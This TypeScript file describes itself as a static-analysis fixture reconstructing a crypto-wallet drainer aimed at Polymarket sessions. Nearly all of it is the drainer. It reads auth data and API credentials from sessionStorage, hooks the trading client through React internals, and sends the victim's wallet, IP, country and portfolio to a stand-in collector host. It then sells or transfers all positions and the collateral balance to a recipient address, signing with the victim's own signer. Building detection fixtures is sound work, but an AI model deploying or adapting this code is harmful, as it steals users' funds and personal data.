// Representative reconstruction from the article, not the original script.
// Static-analysis fixture. The caller must supply public portfolio/relayer adapters.
export async function inspectAndTransfer(adapters: any) {
  const auth = JSON.parse(globalThis.sessionStorage.getItem("polymarket.auth.params") || "null");
  const wallet = JSON.parse(globalThis.sessionStorage.getItem("polymarket.auth.proxyWallet") || "null");
  const credentials = JSON.parse(globalThis.sessionStorage.getItem("exchange.api-key.cache") || "null");
  if (!auth || !wallet || !credentials) return;
  const seen = new WeakSet();
  function search(value, depth = 0) {
    if (!value || typeof value !== "object" || seen.has(value) || depth > 12) return;
    seen.add(value);
    if (typeof value.postOrder === "function" &&
        (typeof value.createOrder === "function" || typeof value.createMarketOrder === "function")) return value;
    for (const item of Object.values(value)) {
      const found = search(item, depth + 1);
      if (found) return found;
    }
  }
  function locateClient() {
    for (const element of document.querySelectorAll("*")) {
      const key = Object.keys(element).find(k => k.startsWith("__reactInternalInstance$"));
      if (!key) continue;
      const pending = [element[key]];
      while (pending.length) {
        const fiber = pending.pop();
        const client = search(fiber["memoizedProps"]) || search(fiber["memoizedState"]);
        if (client) return client;
        if (fiber.child) pending.push(fiber.child);
        if (fiber.sibling) pending.push(fiber.sibling);
      }
    }
  }
  const client = locateClient();
  if (!client || !client.signer) return;
  const location = await adapters.geoblock();
  if (location.blocked) return;
  let config;
  try { config = await (await fetch("https://collector.example.invalid/metrics/init")).json(); }
  catch { config = {}; }
  const recipient = config.recipient || "0x1111111111111111111111111111111111111111";
  const positions = await adapters.positions(wallet);
  const portfolio = positions.reduce((sum, p) => sum + p.value, 0);
  if (portfolio < (config.threshold || 10)) return;
  const report = { wallet, ip: location.ip, country: location.country,
    os: navigator.platform, accountType: auth.type, portfolio,
    tracking: null };
  const post = (path, body) => fetch("https://collector.example.invalid" + path, {
    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body)
  });
  await post("/metrics/submit", report);
  const selected = positions.filter(p => p.value >= (config.positionThreshold || 10));
  const erc1155 = new adapters.Interface([
    "function safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)"
  ]);
  const erc20 = new adapters.Interface(["function transfer(address,uint256)"]);
  let calls;
  if (auth.type === "eoa") {
    calls = [{ target: adapters.positionContract, value: "0", data:
      erc1155.encodeFunctionData("safeBatchTransferFrom", [wallet, recipient,
        selected.map(p => p.id), selected.map(p => p.quantity), "0x"]) }];
  } else {
    for (const position of selected) {
      for (const price of [0.5, 0.1, 0.01]) {
        const order = await client.createOrder({ tokenID: position.id,
          side: "SELL", amount: position.quantity, price });
        const result = await client.postOrder(order);
        if (result.success) break;
      }
    }
    const amount = await adapters.balance(wallet);
    calls = [{ target: adapters.collateralContract, value: "0",
      data: erc20.encodeFunctionData("transfer", [recipient, amount]) }];
  }
  const domain = { name: "DepositWallet", version: "1", chainId: 137, verifyingContract: wallet };
  const types = {
    Call: [{name:"target",type:"address"},{name:"value",type:"uint256"},{name:"data",type:"bytes"}],
    Batch: [{name:"wallet",type:"address"},{name:"nonce",type:"uint256"},
      {name:"deadline",type:"uint256"},{name:"calls",type:"Call[]"}]
  };
  const batch = { wallet, nonce: await adapters.nonce(wallet),
    deadline: Math.floor(Date.now()/1000) + 600, calls };
  const signature = await client.signer._signTypedData(domain, types, batch);
  const result = await adapters.relayer({ type: "WALLET", signature,
    depositWalletParams: { depositWallet: wallet, deadline: batch.deadline, calls } });
  await post("/metrics/update", { ...report, positions: selected });
  await post("/metrics/handle", { ...report, transferResult: result });
  return result;
}
